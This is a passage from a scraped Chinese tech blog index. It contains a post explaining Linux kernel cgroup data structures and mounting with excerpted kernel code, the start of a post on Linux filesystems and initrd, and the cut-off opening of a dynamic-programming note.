&lt;p&gt;在结构体&lt;code&gt;cgroup&lt;/code&gt;中，一个&lt;code&gt;cgroup&lt;/code&gt;实例就是cgroup文件系统中的一个cgroup文件，&lt;code&gt;cgroup&lt;/code&gt;结构体主要作用是关联&lt;code&gt;css_set&lt;/code&gt;和&lt;code&gt;subsys&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;对于&lt;code&gt;task&lt;/code&gt;到&lt;code&gt;cgroup&lt;/code&gt;不需要直接连接，可以通过&lt;code&gt;css_set&lt;/code&gt;引用到&lt;code&gt;cgroup&lt;/code&gt;。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;// include/linux/cgroup.h 
// 子节点cgroup
struct cgroup { 
    … 
    struct list_head sibling;         /* my parent&#39;s children */ 
    struct list_head children;        /* my children */ 
    struct cgroup *parent;            /* my parent */ 

    struct list_head files;           /* my files */ 
    struct dentry *dentry;            /* cgroup fs entry, RCU protected */ 
    struct cgroupfs_root *root;  // 指向hierarchy结构体，每个cgroup文件系统都有一个cgroupfs_root，在mount时创建

    struct cgroup_subsys_state __rcu *subsys[CGROUP_SUBSYS_COUNT]; 

    struct list_head cset_links; 
    … 
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;大致可以分为4部分：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;cgroup层级结构，包括&lt;code&gt;sibling children parent&lt;/code&gt;三个成员；&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;假设存在这样一棵树，根节点有两个儿子，第一个儿子又有两个儿子。那么cgroup层级结构关系如图。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1621992084807.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;cgroup和文件系统的关系，包括&lt;code&gt;files dentry root&lt;/code&gt;三个成员；&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;内核cgroup子系统创造了名为cgroup的虚拟文件系统。每个cgroup节点都和此文件系统中的一个目录相联系。&lt;/p&gt;
&lt;p&gt;结构体中成员&lt;code&gt;dentry *dentry&lt;/code&gt;指向与之相关联的目录，成员&lt;code&gt;list_head files&lt;/code&gt;指向目录下的文件，成员&lt;code&gt;cgroupfs_root*root&lt;/code&gt;指向cgroup文件系统的根节点。&lt;/p&gt;
&lt;p&gt;一个cgroup实例是属于一个层级的，而一个层级有专门的结构体描述，如同文件系统有个&lt;code&gt;super_block&lt;/code&gt;超级块一样。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;// include/linux/cgroup.h 
struct cgroupfs_root { 
… 
    struct super_block *sb;  // 这个层级相关联的文件系统的super_block
    unsigned long subsys_mask;  // 表示这个cgroup文件系统挂载中包含的子系统
    struct cgroup top_cgroup; // 根目录所关联的cgroup
    int number_of_cgroup;  // 表示此层级中包含的cgroup的数量
… 
}; 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;控制组定义了一个新的文件系统，名为&lt;code&gt;cgroup&lt;/code&gt;：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;// kernel/cgroup.c 
static struct file_system_type cgroup_fs_type = { 
    .name = &amp;quot;cgroup&amp;quot;, 
    .mount = cgroup_mount, 
    .kill_sb = cgroup_kill_sb, 
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;示例：&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;mount -t cgroup cgroup -o cpu /sys/fs/cgroup/cpu
mount -t cgroup cgroup -o memory /sys/fs/cgroup/memory
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这两条命令挂载了两个cgroup文件系统，一个使用CPU子系统，一个使用memory子系统、内核中的数据结构如图。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1621993025657.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;cgroup子系统，成员为&lt;code&gt;subsys&lt;/code&gt;；&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;首先先看&lt;code&gt;cgroup_subsys&lt;/code&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;cgroup_subsys&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;cgroup_subsys&lt;/code&gt;描述一个subsys，内核中的subsys在代码里定义好了，不存在动态添加subsys。所有subsys存在数组&lt;code&gt;subsys&lt;/code&gt;中，其数组元素声明在linux/cgroup_subsys.h中，而实际每个元素是定义在各个子系统的文件中，比如mem_cgroup的子系统mem_cgroup_subsys是定义在mm\memcontrol.c中。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;...
static struct cgroup_subsys *subsys[CGROUP_SUBSYS_COUNT] = {
#include &amp;lt;linux/cgroup_subsys.h&amp;gt;
};

struct cgroup_subsys {
    struct cgroup_subsys_state *(*css_alloc)(struct cgroup_subsys_state *parent_css);
    int (*css_online)(struct cgroup_subsys_state *css);
    void (*css_offline)(struct cgroup_subsys_state *css);
    void (*css_free)(struct cgroup_subsys_state *css);
    int (*css_attach)(struct cgroup_subsys_state *css, struct cgroup_taskset *tset);
    void (*cancel_attach)(struct cgroup_subsys_state *css, struct cgroup_taskset *tset);
    void (*attach)(struct cgroup_subsys_state *css, struct cgroup_taskset *tset);
    void (*fork)(struct cgroup_subsys_state *css, struct cgroup_taskset *tset);
    void (*fork)(struct task_struct *task); 
    void (*exit)(struct cgroup_subsys_state *css, struct cgroup_subsys_state 
    *old_css, struct task_struct *task); 
    void (*bind)(struct cgroup_subsys_state *root_css); 
    … 
    struct list_head cftsets; 
    struct cftype *base_cftypes; 
    struct cftype_set base_cftset; 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;每个subsys有自己的属性和操作，用相同的结构体来描述subys有点太困难了，cgroup_subsys描述的是subsys通用的部分，各种不同的subsys(如mem_cgroup，cpu等)是有自己的结构体的。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;cgroup_subsys&lt;/code&gt;的字段主要可以分为三部分：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;回调函数指针变量；&lt;/li&gt;
&lt;li&gt;用于&lt;code&gt;cgroup_subsys&lt;/code&gt;组织结构；&lt;/li&gt;
&lt;li&gt;一部分和cftype相关，每个cgroup目录下都有一些subsys的文件用于设置subsys的属性，这些属性是cftype描述的。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;回调函数&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;回调函数中&lt;code&gt;css_alloc&lt;/code&gt;值得关注，该函数创建具体subsys的结构体并返回一个&lt;code&gt;cgroup_subsys_state&lt;/code&gt;，该结构体的指针是css_set-&amp;gt;subsys数组的元素。mem_cgroup_subsys的css_alloc函数mem_cgroup_css_alloc。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;static struct cgroup_subsys_state * __ref
mem_cgroup_css_alloc(struct cgroup *cont)
{
	struct mem_cgroup *memcg;
	long error = -ENOMEM;
	int node;

	memcg = mem_cgroup_alloc();
	if (!memcg)
		return ERR_PTR(error);

	for_each_node(node)
		if (alloc_mem_cgroup_per_zone_info(memcg, node))
			goto free_out;

	/* root ? */
	if (cont-&amp;gt;parent == NULL) {
		root_mem_cgroup = memcg;
		page_counter_init(&amp;amp;memcg-&amp;gt;memory, NULL);
		memcg-&amp;gt;soft_limit = PAGE_COUNTER_MAX;
		page_counter_init(&amp;amp;memcg-&amp;gt;memsw, NULL);
		page_counter_init(&amp;amp;memcg-&amp;gt;kmem, NULL);
	}

	memcg-&amp;gt;last_scanned_node = MAX_NUMNODES;
	INIT_LIST_HEAD(&amp;amp;memcg-&amp;gt;oom_notify);
	atomic_set(&amp;amp;memcg-&amp;gt;refcnt, 1);
	memcg-&amp;gt;move_charge_at_immigrate = 0;
	mutex_init(&amp;amp;memcg-&amp;gt;thresholds_lock);
	spin_lock_init(&amp;amp;memcg-&amp;gt;move_lock);
	vmpressure_init(&amp;amp;memcg-&amp;gt;vmpressure);

	return &amp;amp;memcg-&amp;gt;css;

free_out:
	__mem_cgroup_free(memcg);
	return ERR_PTR(error);
}

struct mem_cgroup {
	struct cgroup_subsys_state css;
	...
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;组织结构&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;不同子系统的结构体第一个元素都是cgroup_subsys_state以便于使用container_of。以mem_cgroup子系统为例，mem_cgroup子系统的结构体是mem_cgroup，每个css_set都可以container_of css_set-&amp;gt;subsys[mem_cgroup_subsys_id]引用到一个mem_cgroup实例。相对于mem_cgroup结构体，cgroup_subsys用于全局描述一个subsys。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;cftype&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在cgroup文件系统中，每个目录下有各个子系统的文件，而不同子系统的文件是不一样的，内核里通过cftype结构体来描述这些文件。&lt;/p&gt;
&lt;p&gt;cftype这个结构体里主要是一些文件操作函数和文件的描述信息。所有对文件的操作，都会调用这个结构体中的操作函数。每个subsys在cgroup_subsys-&amp;gt;base_cftypes中定义自己专有的文件。而cgroup每个目录下都有些相同的文件像tasks之类的，保存在cgroup.c中的files数组中，这时每个目录都会有的。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;struct cftype {
	/*
	 * By convention, the name should begin with the name of the
	 * subsystem, followed by a period.  Zero length string indicates
	 * end of cftype array.
	 */
	char name[MAX_CFTYPE_NAME];
	int private;
	/*
	 * If not 0, file mode is set to this value, otherwise it will
	 * be figured out automatically
	 */
	umode_t mode;

	/*
	 * If non-zero, defines the maximum length of string that can
	 * be passed to write_string; defaults to 64
	 */
	size_t max_write_len;

	/* CFTYPE_* flags */
	unsigned int flags;
	
	int (*open)(struct inode *inode, struct file *file);
	...		
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;例如CPU子系统：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;// kernel/sched/core.c 
static struct cftype cpu_files[] = {
#ifdef CONFIG_FAIR_GROUP_SCHED
    {
        .name = &amp;quot;shares&amp;quot;, 
        .read_u64 = cpu_shares_read_u64, 
        .write_u64 = cpu_shares_write_u64, 
    },
#endif
#ifdef CONFIG_CFS_BANDWIDTH
    {
        .name = &amp;quot;cfs_quota_us&amp;quot;, 
        .read_s64 = cpu_cfs_quota_read_s64, 
        .write_s64 = cpu_cfs_quota_write_s64, 
    },
    { 
        .name = &amp;quot;cfs_period_us&amp;quot;, 
        .read_u64 = cpu_cfs_period_read_u64, 
        .write_u64 = cpu_cfs_period_write_u64, 
    }, 
    { 
        .name = &amp;quot;stat&amp;quot;, 
        .seq_show = cpu_stats_show, 
    }, 
#endif
#ifdef CONFIG_RT_GROUP_SCHED
    {
        .name = &amp;quot;rt_runtime_us&amp;quot;, 
        .read_s64 = cpu_rt_runtime_read, 
        .write_s64 = cpu_rt_runtime_write, 
    },
    { 
        .name = &amp;quot;rt_period_us&amp;quot;, 
        .read_u64 = cpu_rt_period_read_uint, 
        .write_u64 = cpu_rt_period_write_uint, 
    }, 
#endif
};
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;cgroup_subsys_state&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;结构体&lt;code&gt;cgroup_subsys_state&lt;/code&gt;是一个&amp;quot;中介&amp;quot;，介于结构体&lt;code&gt;cgroup&lt;/code&gt;和结构体&lt;code&gt;cgroup_subsys&lt;/code&gt;之间。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;css_set&lt;/code&gt;有一个&lt;code&gt;cgroup_subsys_state&lt;/code&gt;指针数组，共&lt;code&gt;CGROUP_SUBSYS_COUNT&lt;/code&gt;个元素，意味这每个&lt;code&gt;subsys&lt;/code&gt;在其中都有个&lt;code&gt;cgroup_subsys_state&lt;/code&gt;实例结构体，但这个结构体里并没有包含实际控制信息。那具体控制信息在哪呢？&lt;code&gt;cgroup_subsys_state&lt;/code&gt;实际是和kobjecct类似作用的东西，里面包含了各个subsys共有的信息。通过container_of获取的到subsys直接的实例结构体，subsys的私有控制信息都在该实际结构体中。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c+&#34;&gt;// include/linux/cgroup.h
struct cgroup_subsys_state {

    // 本subsys所依附的cgroup
    struct cgroup *cgroup;

    // 用到的子系统
    struct cgroup_subsys *ss;
    ...
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;cgroup和进程的关系，成员为&lt;code&gt;cset_links&lt;/code&gt;。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;cgroup节点和进程是多对多映射。一个cgrou节点中可以有多个进程，一个进程也可以加入多个cgroup。&lt;/p&gt;
&lt;p&gt;假设有 3 个进程，4 个控制组，进程 1 用到控制组 1 和 3，进程 2 用到控制组 2 和 4，进程 3 用到控制组 2 和 4。从进程的角度看和从控制组的角度看，如图所示。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1621996726696.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;在结构cgroup中有：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;// include/linux/cgroup.h 
struct cgroup { 
… 
    struct list_head cset_links; 
… 
} 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;结构 cgroup 的成员 &lt;code&gt;cset_links&lt;/code&gt; 和另一个结构 &lt;code&gt;cgrp_cset_link&lt;/code&gt; 关联：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;kernel/cgroup.c 
struct cgrp_cset_link { 
    /* the cgroup and css_set this link associates */ 
    struct cgroup *cgrp; 
    struct css_set *cset; 
    /* list of cgrp_cset_links anchored at cgrp-&amp;gt;cset_links */ 
    struct list_head cset_link; 
    /* list of cgrp_cset_links anchored at css_set-&amp;gt;cgrp_links */ 
    struct list_head cgrp_link; 
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;联系在一起，还是上面那个例子，内核中的数据结构如图所示。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;6&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1621996916634.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;cgroup_root&lt;/code&gt;和&lt;code&gt;cgroup&lt;/code&gt;是使用两个不同结构表示的。&lt;/p&gt;
&lt;h3 id=&#34;文件系统接口&#34;&gt;文件系统接口&lt;/h3&gt;
&lt;p&gt;cgroup文件系统是cgroup提供给用户层的控制接口，cgroup文件系统挂不挂载，cgroup都是生效运行的。&lt;/p&gt;
&lt;h4 id=&#34;mount函数&#34;&gt;mount函数&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;static struct dentry *cgroup_mount(struct file_system_type *fs_type,
			 int flags, const char *unused_dev_name,
			 void *data)
{
	struct cgroup_sb_opts opts;
	struct cgroupfs_root *root;
	int ret = 0;
	struct super_block *sb;
	struct cgroupfs_root *new_root;
	struct inode *inode;

	/* First find the desired set of subsystems */
	mutex_lock(&amp;amp;cgroup_mutex);
	ret = parse_cgroupfs_options(data, &amp;amp;opts);//解析挂载参数，看需要attach哪些subsys
	mutex_unlock(&amp;amp;cgroup_mutex);
	if (ret)
		goto out_err;

	/*
	 * Allocate a new cgroup root. We may not need it if we&#39;re
	 * reusing an existing hierarchy.
	 */
	new_root = cgroup_root_from_opts(&amp;amp;opts);//依据挂载参数创建一个新的cgroupfs_root，后面如果有发现已申请了相同的会free掉这个结构体
	if (IS_ERR(new_root)) {
		ret = PTR_ERR(new_root);
		goto drop_modules;
	}
	opts.new_root = new_root;

	/* Locate an existing or new sb for this hierarchy */
	//获取sb这个文件系统的sb
	sb = sget(fs_type, cgroup_test_super, cgroup_set_super, 0, &amp;amp;opts);
	if (IS_ERR(sb)) {
		ret = PTR_ERR(sb);
		cgroup_drop_root(opts.new_root);
		goto drop_modules;
	}

	root = sb-&amp;gt;s_fs_info;
	BUG_ON(!root);
	if (root == opts.new_root) {//未挂载相同参数的cgroup fs
		/* We used the new root structure, so this is a new hierarchy */
		struct list_head tmp_cg_links;
		struct cgroup *root_cgrp = &amp;amp;root-&amp;gt;top_cgroup;
		struct cgroupfs_root *existing_root;
		const struct cred *cred;
		int i;
		struct css_set *cg;

		BUG_ON(sb-&amp;gt;s_root != NULL);

		ret = cgroup_get_rootdir(sb);
		if (ret)
			goto drop_new_super;
		inode = sb-&amp;gt;s_root-&amp;gt;d_inode;

		mutex_lock(&amp;amp;inode-&amp;gt;i_mutex);
		mutex_lock(&amp;amp;cgroup_mutex);
		mutex_lock(&amp;amp;cgroup_root_mutex);

		/* Check for name clashes with existing mounts */
		ret = -EBUSY;
		if (strlen(root-&amp;gt;name))
			for_each_active_root(existing_root)
				if (!strcmp(existing_root-&amp;gt;name, root-&amp;gt;name))
					goto unlock_drop;

		/*
		 * We&#39;re accessing css_set_count without locking
		 * css_set_lock here, but that&#39;s OK - it can only be
		 * increased by someone holding cgroup_lock, and
		 * that&#39;s us. The worst that can happen is that we
		 * have some link structures left over
		 */
		//css_set_count是内核中已有css_set的个数
		ret = allocate_cg_links(css_set_count, &amp;amp;tmp_cg_links);
		if (ret)
			goto unlock_drop;

		//将subsys_mask指示的subsys绑定到当前cgroupfs_root
		ret = rebind_subsystems(root, root-&amp;gt;subsys_mask);
		if (ret == -EBUSY) {
			free_cg_links(&amp;amp;tmp_cg_links);
			goto unlock_drop;
		}
		/*
		 * There must be no failure case after here, since rebinding
		 * takes care of subsystems&#39; refcounts, which are explicitly
		 * dropped in the failure exit path.
		 */

		/* EBUSY should be the only error here */
		BUG_ON(ret);

		list_add(&amp;amp;root-&amp;gt;root_list, &amp;amp;roots);
		root_count++;

		sb-&amp;gt;s_root-&amp;gt;d_fsdata = root_cgrp;
		root-&amp;gt;top_cgroup.dentry = sb-&amp;gt;s_root;

		/* Link the top cgroup in this hierarchy into all
		 * the css_set objects */
		//将当前所有的css_set关联到这个root_cgrp中
		write_lock(&amp;amp;css_set_lock);
		hash_for_each(css_set_table, i, cg, hlist)
			link_css_set(&amp;amp;tmp_cg_links, cg, root_cgrp);
		write_unlock(&amp;amp;css_set_lock);

		free_cg_links(&amp;amp;tmp_cg_links);

		BUG_ON(!list_empty(&amp;amp;root_cgrp-&amp;gt;children));
		BUG_ON(root-&amp;gt;number_of_cgroup != 1);

		cred = override_creds(&amp;amp;init_cred);
		cgroup_populate_dir(root_cgrp, true, root-&amp;gt;subsys_mask);// 创建根目录下的文件
		revert_creds(cred);
		mutex_unlock(&amp;amp;cgroup_root_mutex);
		mutex_unlock(&amp;amp;cgroup_mutex);
		mutex_unlock(&amp;amp;inode-&amp;gt;i_mutex);
	} else { //已存在相同参数的文件系统
		...
	}

	...
	return ERR_PTR(ret);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;cgroup文件系统的挂载主要是将参数所指定的subsys绑定到文件系统，并将新层级的根cgroup关联到现有的css_set中。将subsys绑定到文件系统用的是rebind_subsystems这个函数，为什么叫rebind呢？因为这个函数是将原来绑定到rootnode的subsys绑定到新的cgroupfs_root。而这里的绑定，是将subsys-&amp;gt;root指向新的cgroupfs_root中。&lt;/p&gt;
&lt;h3 id=&#34;各个子系统的实现&#34;&gt;各个子系统的实现&lt;/h3&gt;
&lt;p&gt;上面可以知道，内核中的cgroup机制提供一个框架，通过在其中添加子系统，可以实现对进程的不同资源进行限制。以cpuacct为例，其子系统实现在kernel/sched/cpuacct.c，这是在调度系统里添加的一个子系统，用于进程占用时间片的统计。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;struct cgroup_subsys cpuacct_subsys = {
	.name		= &amp;quot;cpuacct&amp;quot;,
	.css_alloc	= cpuacct_css_alloc,
	.css_free	= cpuacct_css_free,
	.subsys_id	= cpuacct_subsys_id,
	.base_cftypes	= files,
	.early_init	= 1,
};
static struct cftype files[] = {
	{
		.name = &amp;quot;usage&amp;quot;,
		.read_u64 = cpuusage_read,
		.write_u64 = cpuusage_write,
	},
	{
		.name = &amp;quot;usage_percpu&amp;quot;,
		.read_seq_string = cpuacct_percpu_seq_read,
	},
	{
		.name = &amp;quot;stat&amp;quot;,
		.read_map = cpuacct_stats_show,
	},
	{ }	/* terminate */
};
/* track cpu usage of a group of tasks and its child groups */
struct cpuacct {
	struct cgroup_subsys_state css;
	/* cpuusage holds pointer to a u64-type object on every cpu */
	u64 __percpu *cpuusage;
	struct kernel_cpustat __percpu *cpustat;
};
void cpuacct_charge(struct task_struct *tsk, u64 cputime)
{
	struct cpuacct *ca;
	int cpu;

	cpu = task_cpu(tsk);

	rcu_read_lock();

	ca = task_ca(tsk);

	while (true) {
		u64 *cpuusage = per_cpu_ptr(ca-&amp;gt;cpuusage, cpu);
		*cpuusage += cputime;

		ca = parent_ca(ca);
		if (!ca)
			break;
	}

	rcu_read_unlock();
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;cpuacct实现很简单，定义了cpuacct_subsys，它的属性只有三个，内嵌cgroup_subsys_state的结构体也只有两个额外的percpu变量。其运行原理是在进程调度的时候调用cpuacct_charge将进程运行时间记录到进程相关的cgroup的cpuacct子系统的结构体中。在用户读相关cgroup文件的时候将其打印出来。&lt;/p&gt;
&lt;h2 id=&#34;总结&#34;&gt;总结&lt;/h2&gt;
&lt;p&gt;cgroup的组指的是一组进程。如果不做干预，进程创建的子进程会被自动加入到进程所在的控制组之中。控制组的优点是可以针对一组数量不定的进程进行控制和统计。&lt;/p&gt;
&lt;p&gt;控制组没有增加新的系统调用，而是实现了一种新的文件系统 cgroup。有了 cgroup 文件系统，创建和删除控制组就转化为创建和删除目录，查看资源使用情况和调整参数就转化为读写文件。相比系统调用，操作文件无疑更加方便。&lt;/p&gt;
">【linux】CGroup</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/linux-wen-jian-xi-tong-yu-cao-zuo/"" data-c="
          &lt;h2 id=&#34;文件系统&#34;&gt;文件系统&lt;/h2&gt;
&lt;p&gt;文件系统是用来管理硬件存储设备存储文件的方式，数据在外部存储设备上都是以二进制形式存储，那么何为文件、何为目录、何为可执行程序，怎么读写，怎么规划存储空间都是由文件系统决定，不同的文件系统管理方式不同。&lt;/p&gt;
&lt;p&gt;文件系统的功能就是对存储设备的扇区进行管理，将这些扇区的访问变成了对目录和文件名的访问。我们在上层按照特定的目录和文件名去访问一个文件时，文件系统会将这个目录+文件名转换成对扇区号的访问。&lt;/p&gt;
&lt;h2 id=&#34;根文件系统&#34;&gt;根文件系统&lt;/h2&gt;
&lt;p&gt;内核刚启动时，磁盘设备、网络设备都还没有被驱动起来，所以无法访问磁盘，没法给磁盘启用对应的文件系统。那赶紧安装磁盘驱动程序，网络驱动程序呀，怎么不加载呢？因为磁盘种类太多了，没法把所有的驱动都编译到内核里头，那样内核得变得多大呀，所以就只能把这些驱动程序编译成模块的方式，在内核加载的时候现场判断当前用的是什么磁盘再加相应的磁盘驱动模块。但是还没文件系统，没有办法加载驱动模块。&lt;/p&gt;
&lt;p&gt;结果启用文件系统的前提是磁盘的驱动程序已经加载，而驱动程序的加载的前提是已经有文件系统存在，所以此时的方法就是在内存建立一个临时文件系统(/boot/initrd文件)，然后指定这个文件系统为根文件系统，借助这个临时的文件系统把磁盘驱动模块、网络驱动模块加载上，这样就可以访问磁盘、网络设备等外设了，可以挂载切换到实际的文件系统了，有了实际的文件系统之后再把这个实际的文件系统指定为根文件系统，然后其他的各式各样的文件系统就可以陆陆续续的挂载在这个根文件系统下了。&lt;/p&gt;
&lt;p&gt;怎么在内存建立虚拟文件系统？&lt;/p&gt;
&lt;p&gt;首先，在编译内核得时候就编译一个很精简的虚拟文件系统进去，然后内核在启动的时候先注册一个rootfs这个虚拟文件系统，然后挂载这个虚拟文件系统，那rootfs这个虚拟文件还是个空的，得给里头放点东西呀，放什么呢？就放编译进内核里头的那个很精简的虚拟文件系统里的内容。怎么内容放进rootfs里去？方法简单粗暴，直接把编译进内核里头的那个很精简的虚拟文件系统里的内容解压到rootfs里，这个过程叫填充rootfs。&lt;/p&gt;
&lt;p&gt;根文件系统是内核启动时所mount的第一个文件系统，内核代码映像文件保存在根文件系统中(/boot)，在启动过程中在根文件系统挂载完成后把一些基本的初始化脚本和服务加载到内存中运行。&lt;/p&gt;
&lt;p&gt;我们平常所理解的文件系统一般是指磁盘文件系统，在linux中磁盘文件一般需要挂载到根文件系统的/dev下。而根文件系统是内核启动后加载到内存当中的？&lt;/p&gt;
&lt;p&gt;根文件系统通常有这几种方式挂载：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;文件系统已经存在于硬盘（或者类似的设备）的某个分区上了，kernel根据启动的命令行参数（root＝/dev/xxx)，直接进行mount。这里有一个问题，在root文件系统本身还不存在的情况下，kernel如何根据/dev/xxx来找到对应的设备呢？原来kernel通过直接解析设备的名称来获得设备的主、从设备号，然后就可以访问对应的设备驱动了。所以在init/main.c中有很长一串的root_dev_names，通过这个表就可以根据设备名称得到设备号。&lt;/li&gt;
&lt;li&gt;启动时用到initrd来mount根文件系统。在将内核加载到内存中前，将一个比较小的根文件系统镜像加载到内存当中(/boot/initrd)，姑且将这段内存称为initrd然后通过传递参数的方式告诉内核initrd的起始地址和大小(也可以把这些参数编译在内核中)，在启动阶段就可以暂时的用initrd来mount根文件系统，initrd的最初的目的是为了把kernel的启动分成两个阶段：在kernel中保留最少最基本的启动代码，然后把对各种各样硬件设备的支持以模块的方式放在initrd中，这样就在启动过程中可以从initrd所mount的根文件系统中装载需要的模块。这样的一个好处就是在保持kernel不变的情况下，通过修改initrd中的内容就可以灵活的支持不同的硬件。在启动完成的最后阶段，根文件系统可以重新mount到其他设备上，但是也可以不再重新mount(很多嵌入式系统就是这样)。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;linux操作系统的磁盘分区与目录结构&#34;&gt;linux操作系统的磁盘分区与目录结构&lt;/h2&gt;
&lt;p&gt;文件系统以磁盘为基础存储文件，文件系统是一个逻辑概念，磁盘是一个物理概念。&lt;/p&gt;
&lt;h3 id=&#34;磁盘分区&#34;&gt;磁盘分区&lt;/h3&gt;
&lt;p&gt;硬盘分区包括&lt;strong&gt;主分区&lt;/strong&gt;、&lt;strong&gt;扩展分区&lt;/strong&gt;和&lt;strong&gt;逻辑分区&lt;/strong&gt;。linux规定每个硬盘设备最多能有4个主分区(其中包含扩展分区)，每个扩展分区需要占用一个主分区号，即主分区和扩展分区总共不超过4个，逻辑分区的数量不限。&lt;/p&gt;
&lt;p&gt;linux中每个设备都能映射到一个系统的文件，对于硬盘，驱动标识符为&lt;code&gt;sdx*&lt;/code&gt;，&lt;code&gt;sd&lt;/code&gt;表明设备类型，&lt;code&gt;x&lt;/code&gt;为盘好(a是基本盘，b是基本从属盘，c是辅助主盘，d是辅助从属盘)；&lt;code&gt;*&lt;/code&gt;代表分区，前4个分区用数字1~4表示，表示主分区或扩展分区。例如&lt;code&gt;sda2&lt;/code&gt;表示第1个硬盘上的第2个主分区或扩展分区。&lt;/p&gt;
&lt;p&gt;每一个分区都是一个文件系统，都有自己的目录层次结构。&lt;/p&gt;
&lt;h3 id=&#34;linux常见的文件系统&#34;&gt;linux常见的文件系统&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;ext2文件系统&lt;/li&gt;
&lt;li&gt;ext3文件系统&lt;/li&gt;
&lt;li&gt;Swap文件系统&lt;/li&gt;
&lt;li&gt;VFAT&lt;/li&gt;
&lt;li&gt;NFS&lt;/li&gt;
&lt;li&gt;XFS&lt;/li&gt;
&lt;li&gt;IOS 9660&lt;/li&gt;
&lt;li&gt;proc&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;虚拟文件系统&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;linux目录结构&#34;&gt;linux目录结构&lt;/h3&gt;
&lt;h2 id=&#34;常用的磁盘操作命令&#34;&gt;常用的磁盘操作命令&lt;/h2&gt;
&lt;h2 id=&#34;linux文件系统的挂载操作&#34;&gt;linux文件系统的挂载操作&lt;/h2&gt;
&lt;h2 id=&#34;常用的文件操作&#34;&gt;常用的文件操作&lt;/h2&gt;
&lt;p&gt;https://www.cnblogs.com/zongzi10010/p/10023700.html&lt;/p&gt;
">【linux】文件系统与操作</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/dong-tai-gui-hua-xian-xing-dp/"" data-c="
          &lt;p&gt;如果某一问题有很多重叠子问题。&lt;/p&gt;
&lt;p&gt;动规中每一个状态一定是由上一个状态推导出来的，这一点区别于贪心。贪心没有推导状态，而是从局部直接选取最优的。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;确定dp数组以及下标的含义&lt;/li&gt;
&lt;li&gt;确定递推公式&lt;/li&gt;
&lt;li&gt;dp数组如何初始化&lt;/li&gt;
